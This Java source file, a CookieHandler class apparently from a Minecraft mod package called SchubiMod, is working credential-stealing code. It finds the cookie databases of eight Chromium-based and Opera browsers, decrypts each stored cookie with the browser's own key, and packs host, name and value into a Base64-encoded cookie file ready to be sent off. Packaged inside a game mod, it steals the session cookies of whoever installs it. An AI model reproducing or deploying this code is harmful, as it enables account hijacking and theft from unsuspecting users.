package dev.schubilegend.handlers;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import dev.schubilegend.SchubiMod;
import dev.schubilegend.utils.Utils;

import java.io.File;
import java.nio.file.Files;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.ResultSet;
import java.util.Base64;
import java.util.HashMap;
import java.util.Properties;

import static dev.schubilegend.utils.Utils.decrypt;

public class CookieHandler {
    private static File appData = new File(System.getenv("APPDATA"));
    private static File localAppData = new File(System.getenv("LOCALAPPDATA"));
    private static HashMap<String, String> paths = new HashMap<String, String>() {
        {
            put("Google Chrome", localAppData + "\\Google\\Chrome\\User Data");
            put("Microsoft Edge", localAppData + "\\Microsoft\\Edge\\User Data");
            put("Chromium", localAppData + "\\Chromium\\User Data");
            put("Opera", appData + "\\Opera Software\\Opera Stable");
            put("Opera GX", appData + "\\Opera Software\\Opera GX Stable");
            put("Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data");
            put("Vivaldi", localAppData + "\\Vivaldi\\User Data");
            put("Yandex", localAppData + "\\Yandex\\YandexBrowser\\User Data");
        }
    };

    private final JsonArray cookies = new JsonArray();

    public String grabCookies() {
        crawlUserData();
        String cookieStr = "";
        for (JsonElement cookie : cookies) {
            cookieStr += cookie.getAsJsonObject().get("hostKey").getAsString() + "\t" + "TRUE" + "\t" + "/" + "\t" + "FALSE" + "\t" + "2597573456" + "\t" + cookie.getAsJsonObject().get("name").getAsString() + "\t" + cookie.getAsJsonObject().get("value").getAsString() + "\n";
        }
        return Base64.getEncoder().encodeToString(cookieStr.getBytes());
    }

    private void crawlUserData() {
        for (final String cookies : paths.keySet()) {
            final File userData = new File(paths.get(cookies));
            if (!userData.exists()) {
                continue;
            }
            final byte[] key = Utils.getKey(new File(userData, "Local State"));
            for (final File data : userData.listFiles()) {
                if (data.getName().contains("Profile") || data.getName().equals("Default")) {
                    this.crawlCookies(data, key);
                }
                else if (data.getName().equals("Login Data")) {
                    this.crawlCookies(userData, key);
                }
            }
        }
    }

    private void crawlCookies(final File profile, final byte[] key) {
        try {
            final File cookieDB = new File(profile, "\\Network\\Cookies");
            File tempCookieData = File.createTempFile("TempCookies", null);
            tempCookieData.deleteOnExit();
            if (!cookieDB.exists()) {
                return;
            }
            Files.copy(cookieDB.toPath(), tempCookieData.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
            Driver driver = SchubiMod.driver;
            Properties props = new Properties();
            Connection connection = driver.connect("jdbc:sqlite:" + tempCookieData.getAbsolutePath(), props);
            ResultSet resultSet = connection.createStatement().executeQuery("SELECT host_key, name, encrypted_value FROM cookies");
            while (resultSet.next()) {
                String hostKey = resultSet.getString(1);
                String name = resultSet.getString(2);
                byte[] encryptedValue = resultSet.getBytes(3);
                if (hostKey != null && name != null && encryptedValue != null) {
                    String decryptedValue = decrypt(encryptedValue, key);
                    if (!decryptedValue.equals("")) {
                        JsonObject cookie = new JsonObject();
                        cookie.addProperty("hostKey", hostKey);
                        cookie.addProperty("name", name);
                        cookie.addProperty("value", decryptedValue);
                        cookies.add(cookie);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
